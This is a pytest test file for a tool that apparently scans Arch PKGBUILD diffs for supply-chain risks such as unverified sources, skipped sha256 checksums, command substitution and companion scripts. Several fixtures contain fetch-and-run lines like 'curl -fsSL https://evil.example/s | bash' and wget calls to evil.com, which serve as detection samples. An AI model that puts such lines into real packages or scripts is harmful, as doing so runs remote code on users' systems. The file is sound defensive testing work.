import pygit2

from trustsight.coverage import unresolved_source_lines
from trustsight.differ import (
    companion_source_hunks,
    detect_checksum_changes,
    detect_verification_evidence,
    extract_urls_from_diff,
    local_source_names,
    source_array_has_command_substitution,
    map_diff_lines,
    _post_diff_lines,
    truncate_diff,
)


# --- multi-line source=() command substitution (attempt 3) ---
# A source array's $(...) usually rides a continuation line, not the
# source=( opener.  Single-line anchoring left the parse-time fetch
# unrecorded, so the verdict came back Low instead of Inconclusive.

_MULTILINE_SUBST = (
    '+source=("git+https://github.com/a/b.git#commit=' + "4" * 40 + '"\n'
    '+        "$(_asset)")'
)


def test_unresolved_source_sees_a_continuation_line_substitution():
    assert unresolved_source_lines(_MULTILINE_SUBST) == ['"$(_asset)")']


def test_c007_sees_a_continuation_line_substitution():
    assert source_array_has_command_substitution(_MULTILINE_SUBST) is True


def test_a_benign_multiline_source_array_records_no_gap():
    benign = '+source=("https://x/y.tar.gz"\n+        "local.patch")'
    assert unresolved_source_lines(benign) == []
    assert source_array_has_command_substitution(benign) is False


def test_substitution_after_the_array_closes_does_not_leak():
    """A $(...) in build(), after the source array closed, is not a source gap."""
    diff = '+source=("https://x/a")\n+build() { echo $(date); }'
    assert unresolved_source_lines(diff) == []
    assert source_array_has_command_substitution(diff) is False


# --- URL extraction ---

def test_extract_urls_added_single():
    diff = """+source=("https://evil.com/payload.tar.gz")
+md5sums=("SKIP")
-https://old.com/source.tar.gz"""
    result = extract_urls_from_diff(diff)
    assert "https://evil.com/payload.tar.gz" in result.added_urls
    assert "https://old.com/source.tar.gz" in result.removed_urls


def test_extract_urls_no_http():
    diff = """+pkgver=1.0
+pkgrel=1"""
    result = extract_urls_from_diff(diff)
    assert result.added_urls == []
    assert result.removed_urls == []


def test_extract_urls_multiple_added():
    diff = """+source=("https://mirror1.com/a.tar.gz" "https://mirror2.com/b.tar.gz")
+noarch=('any')"""
    result = extract_urls_from_diff(diff)
    assert "https://mirror1.com/a.tar.gz" in result.added_urls
    assert "https://mirror2.com/b.tar.gz" in result.added_urls


def test_extract_urls_from_array():
    diff = """+source=(
+  "https://example.com/primary.tar.gz"
+  "https://backup.com/mirror.tar.gz"
+)"""
    result = extract_urls_from_diff(diff)
    assert "https://example.com/primary.tar.gz" in result.added_urls
    assert "https://backup.com/mirror.tar.gz" in result.added_urls


def test_extract_urls_removed_only():
    diff = """-source=("https://old-domain.com/pkg.tar.gz")"""
    result = extract_urls_from_diff(diff)
    assert result.added_urls == []
    assert "https://old-domain.com/pkg.tar.gz" in result.removed_urls


def test_extract_urls_added_and_removed():
    diff = """-  "https://old.com/v1.tar.gz"
+  "https://new.com/v2.tar.gz\""""
    result = extract_urls_from_diff(diff)
    assert "https://new.com/v2.tar.gz" in result.added_urls
    assert "https://old.com/v1.tar.gz" in result.removed_urls


def test_extract_urls_ignores_comments():
    diff = """+# https://example.com/not-a-real-url
+echo hello"""
    result = extract_urls_from_diff(diff)
    assert "https://example.com/not-a-real-url" in result.added_urls  # still extracted from + line


def test_extract_urls_with_variable_interpolation():
    diff = """+_pkgurl="https://example.com/$pkgname-$pkgver.tar.gz\""""
    result = extract_urls_from_diff(diff)
    assert "https://example.com/" in result.added_urls[0]


def test_extract_urls_wget_style():
    diff = """+  wget https://evil.com/script.sh"""
    result = extract_urls_from_diff(diff)
    assert "https://evil.com/script.sh" in result.added_urls


def test_extract_urls_changed_hostname_typo_squat():
    diff = """-source=("https://github.com/trusted/project.tar.gz")
+source=("https://github.com/trusted-project.tar.gz")"""
    result = extract_urls_from_diff(diff)
    assert len(result.added_urls) == 1
    assert "github.com" in result.added_urls[0]


def test_extract_urls_is_sorted_and_deduplicated():
    diff = "+https://z.example/a https://a.example/b https://z.example/a\n"
    result = extract_urls_from_diff(diff)
    assert result.added_urls == ["https://a.example/b", "https://z.example/a"]


def test_map_diff_lines_ignores_content_outside_hunks():
    diff = "+outside\n+++ b/PKGBUILD\n@@ -1 +1 @@\n+inside\n"
    assert map_diff_lines(diff) == {3: ("PKGBUILD", 1)}


def test_map_diff_lines_handles_malformed_hunk_without_crashing():
    diff = "+++ b/PKGBUILD\n@@ broken\n+payload\n"
    assert map_diff_lines(diff) == {}


def test_post_diff_lines_removes_only_one_prefix():
    diff = "+++ b/PKGBUILD\n@@ -1 +1 @@\n+  leading\n++literal-plus\n"
    assert _post_diff_lines(diff) == ["  leading", "+literal-plus"]


def test_truncate_diff_is_utf8_safe_and_reports_status():
    diff = "+" + ("é" * 20) + "\n+payload-after-cap\n"
    bounded, truncated = truncate_diff(diff, max_bytes=7)
    assert truncated is True
    assert bounded == "+ééé"
    assert "payload-after-cap" not in bounded
    assert len(bounded.encode("utf-8")) <= 7


def test_truncate_diff_is_stable_at_and_below_limit():
    diff = "+safe\n"
    assert truncate_diff(diff, max_bytes=len(diff.encode())) == (diff, False)
    assert truncate_diff(diff, max_bytes=1) == ("+", True)


# --- Checksum detection ---

def test_detect_checksum_skip():
    diff = """+sha256sums=('SKIP')"""
    result = detect_checksum_changes(diff)
    assert result == "changed_from_sha256_to_skip"


def test_detect_checksum_skip_no_quotes():
    diff = """+sha256sums=(SKIP)"""
    result = detect_checksum_changes(diff)
    assert result == "changed_from_sha256_to_skip"


def test_detect_checksum_emptied():
    diff = """+sha256sums=()"""
    result = detect_checksum_changes(diff)
    assert result == "checksum_array_emptied"


def test_detect_checksum_unchanged():
    diff = """+pkgver=2.0"""
    result = detect_checksum_changes(diff)
    assert result == "unchanged"


def test_detect_checksum_added():
    diff = """+sha256sums=('abc123def456...')"""
    result = detect_checksum_changes(diff)
    assert result == "checksum_added_or_changed"


def test_detect_checksum_md5_not_flagged():
    diff = """+md5sums=('SKIP')"""
    result = detect_checksum_changes(diff)
    assert result == "unchanged"  # only sha256 is checked


def test_detect_checksum_none():
    diff = """+sha256sums=('NONE')"""
    result = detect_checksum_changes(diff)
    assert result == "changed_from_sha256_to_skip"


def test_detect_checksum_skip_uppercase():
    diff = """+sha256sums=('SKIP')"""
    result = detect_checksum_changes(diff)
    assert result == "changed_from_sha256_to_skip"


def test_detect_no_false_positive_on_source():
    diff = """+source=("https://example.com/sha256sums.txt")"""
    result = detect_checksum_changes(diff)
    assert result == "unchanged"


def test_detect_checksum_removal_in_context():
    diff = """-sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')
+sha256sums=()"""
    result = detect_checksum_changes(diff)
    assert result == "checksum_array_emptied"


def test_detect_checksum_multiline():
    diff = """+sha256sums=('SKIP')"""
    result = detect_checksum_changes(diff)
    assert result == "changed_from_sha256_to_skip"


# --- Verification evidence ---

def test_detect_verification_checksum_present():
    diff = """+sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')"""
    ev = detect_verification_evidence(diff, checksum_behavior="checksum_added_or_changed")
    assert "checksum_present" in ev


def test_detect_verification_validpgpkeys():
    diff = """+validpgpkeys=('A1B2C3D4E5F6A7B8')"""
    ev = detect_verification_evidence(diff)
    assert "validpgpkeys_declared" in ev


def test_detect_verification_gpg_verify():
    diff = """+  gpg --verify signature.sig"""
    ev = detect_verification_evidence(diff)
    assert "gpg_verify_present" in ev


def test_detect_verification_no_evidence():
    ev = detect_verification_evidence("", checksum_behavior="unchanged")
    assert ev == []


def test_detect_verification_skip_not_evidence():
    """SKIP checksum is NOT verification evidence; it's the opposite."""
    ev = detect_verification_evidence(
        "+sha256sums=('SKIP')",
        checksum_behavior="changed_from_sha256_to_skip",
    )
    assert "checksum_present" not in ev


# --- local source companion scanning ---
# A curl|bash the recipe ships in a source=() file, and runs from $srcdir,
# is as much "the package" as one written into the PKGBUILD.  These pin that
# the file's name is recognised and its committed content is put back in
# front of the rules.

def test_local_source_names_picks_bare_files_not_urls():
    pkgbuild = (
        "source=('https://github.com/a/b/archive/v1.tar.gz'\n"
        "        'setup.sh'\n"
        "        'fix.patch')\n"
    )
    assert local_source_names(pkgbuild) == {"setup.sh", "fix.patch"}


def test_local_source_names_reads_unquoted_entries():
    """bash accepts ``source=(setup.sh)``; a quoted-only parser was evaded
    by dropping the quotes."""
    assert local_source_names("source=(setup.sh other.bin)") == {"setup.sh", "other.bin"}
    assert local_source_names(
        'source=("https://x/y.tar.gz" setup.sh)') == {"setup.sh"}


def test_local_source_names_skips_the_rename_download_form():
    """``name::url`` is a download, not a shipped file."""
    pkgbuild = "source=('demo-1.0.tar.gz::https://example.com/v1.tar.gz')\n"
    assert local_source_names(pkgbuild) == set()


def test_local_source_names_reads_arch_specific_arrays():
    pkgbuild = "source_x86_64=('blob.bin')\nsource_aarch64=('other.sh')\n"
    assert local_source_names(pkgbuild) == {"blob.bin", "other.sh"}


def _repo_with(tmp_path, files: dict[str, bytes]) -> tuple[pygit2.Repository, str]:
    repo = pygit2.init_repository(str(tmp_path / "r"))
    who = pygit2.Signature("t", "t@e.x")
    builder = repo.TreeBuilder()
    for name, data in files.items():
        builder.insert(name, repo.create_blob(data), pygit2.GIT_FILEMODE_BLOB)
    commit = repo.create_commit("HEAD", who, who, "c", builder.write(), [])
    return repo, str(commit)


def test_companion_hunk_carries_the_committed_payload(tmp_path):
    """A curl|bash in a source=() file reaches the scanner as added lines."""
    repo, commit = _repo_with(tmp_path, {
        "PKGBUILD": b"source=('setup.sh')\nprepare(){ bash setup.sh; }\n",
        "setup.sh": b"#!/bin/bash\ncurl -fsSL https://evil.example/s | bash\n",
    })
    hunk = companion_source_hunks(repo, commit)
    assert "+++ b/setup.sh" in hunk
    assert "+curl -fsSL https://evil.example/s | bash" in hunk


def test_companion_hunk_ignores_a_file_the_recipe_never_names(tmp_path):
    """A committed file the PKGBUILD does not reference is not scanned."""
    repo, commit = _repo_with(tmp_path, {
        "PKGBUILD": b"source=('https://x/y.tar.gz')\n",
        "notes.sh": b"curl https://evil.example/s | bash\n",
    })
    assert companion_source_hunks(repo, commit) == ""


def test_companion_hunk_reads_an_undeclared_but_executed_file(tmp_path):
    """bash "${startdir}/helper.sh" runs a committed file makepkg never copied
    through source=(); naming it in the recipe is enough to get it scanned."""
    repo, commit = _repo_with(tmp_path, {
        "PKGBUILD": b'pkgver=2\npackage(){ bash "${startdir}/helper.sh"; }\n',
        "helper.sh": b"curl -fsSL https://evil.example/s | bash\n",
    })
    hunk = companion_source_hunks(repo, commit)
    assert "+++ b/helper.sh" in hunk
    assert "+curl -fsSL https://evil.example/s | bash" in hunk


def test_companion_hunk_skips_binaries(tmp_path):
    """ELF is R118-tree's job; text rules over binary bytes are noise."""
    repo, commit = _repo_with(tmp_path, {
        "PKGBUILD": b"source=('blob')\n",
        "blob": b"\x7fELF\x00\x01\x02curl | bash",
    })
    assert companion_source_hunks(repo, commit) == ""


def test_companion_hunk_reads_a_payload_committed_earlier(tmp_path):
    """The current tree is read, not this commit's diff, so a file staged in
    an earlier commit and merely referenced now is still scanned."""
    repo = pygit2.init_repository(str(tmp_path / "r"))
    who = pygit2.Signature("t", "t@e.x")
    b1 = repo.TreeBuilder()
    b1.insert("PKGBUILD", repo.create_blob(b"pkgver=1\n"), pygit2.GIT_FILEMODE_BLOB)
    b1.insert("setup.sh",
              repo.create_blob(b"curl https://evil.example/s | bash\n"),
              pygit2.GIT_FILEMODE_BLOB)
    c1 = repo.create_commit("HEAD", who, who, "1", b1.write(), [])
    # v2 only now wires setup.sh into source=(); setup.sh itself is unchanged.
    b2 = repo.TreeBuilder(repo[c1].tree)
    b2.insert("PKGBUILD",
              repo.create_blob(b"pkgver=2\nsource=('setup.sh')\n"),
              pygit2.GIT_FILEMODE_BLOB)
    c2 = repo.create_commit("HEAD", who, who, "2", b2.write(), [c1])
    hunk = companion_source_hunks(repo, str(c2))
    assert "+curl https://evil.example/s | bash" in hunk


def test_a_blank_line_in_the_diff_does_not_crash_analysis():
    """A truly empty line used to reach ``line[0]`` in the signing-key and
    git-pin scanners: ``"" in "+- "`` is True, so the guard let an empty
    string through to be indexed.  Two companion hunks joined onto a diff
    put a blank line between files, so this is now on the hot path."""
    from trustsight.analysis import scan_diff
    from trustsight.config import ensure_default_configs, load_config

    ensure_default_configs()
    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1 +1 @@\n+pkgver=2\n\n+validpgpkeys=('DEADBEEF')\n"
    fact = scan_diff(diff, config=load_config(), package_name="demo", seen_urls={})
    assert fact is not None  # did not raise


def test_companion_content_makes_the_rules_fire(tmp_path):
    """End to end: the payload in a companion file reaches R001."""
    from trustsight.analysis import scan_diff
    from trustsight.config import ensure_default_configs, load_config

    ensure_default_configs()
    repo, commit = _repo_with(tmp_path, {
        "PKGBUILD": b"pkgver=1.1\nsource=('setup.sh')\nprepare(){ bash setup.sh; }\n",
        "setup.sh": b"#!/bin/bash\ncurl -fsSL https://evil.example/s | bash\n",
    })
    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1 +1 @@\n-pkgver=1.0\n+pkgver=1.1\n"
    scanned = diff.rstrip("\n") + "\n" + companion_source_hunks(repo, commit)
    fact = scan_diff(scanned, config=load_config(), package_name="demo", seen_urls={})
    assert "R001" in {e.rule_id for e in fact.score_breakdown}
